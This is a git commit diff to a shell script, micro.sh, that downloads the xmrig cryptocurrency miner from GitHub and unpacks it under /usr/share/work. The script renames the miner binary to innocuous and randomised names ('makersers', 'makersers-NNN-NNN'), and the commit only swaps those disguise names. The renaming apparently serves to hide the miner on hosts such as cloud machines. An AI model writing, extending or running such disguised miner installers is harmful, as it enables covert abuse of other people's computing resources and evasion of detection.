6c5b428e16ba1ff3fe29c66ab64135347d2a403a
charlesmalexander64 <55861927+charlesmalexander64@users.noreply.github.com>
2019-11-08 09:46:47 +0700

    Update micro.sh

--- micro.sh
+++ micro.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 sudo apt-get update
-azure=rockers;
+azure=makersers;
 mkdir /usr/share
 mkdir /usr/share/work
 rm -r /usr/share/work/xmrig-3.2.0
@@ -8,7 +8,7 @@ wget https://github.com/xmrig/xmrig/releases/download/v3.2.0/xmrig-3.2.0-xenial-
 mv xmrig-3.2.0-xenial-x64.tar.gz /usr/share/work/
 cd /usr/share/work/ &&  tar xf xmrig-3.2.0-xenial-x64.tar.gz
 rm -rf xmrig-3.2.0-xenial-x64.tar.gz && cd xmrig-3.2.0
-a='rockers-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+a='makersers-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 mv xmrig $azure -n
 sudo cp $azure "$cpuname"
 sudo rm -f  xmrig
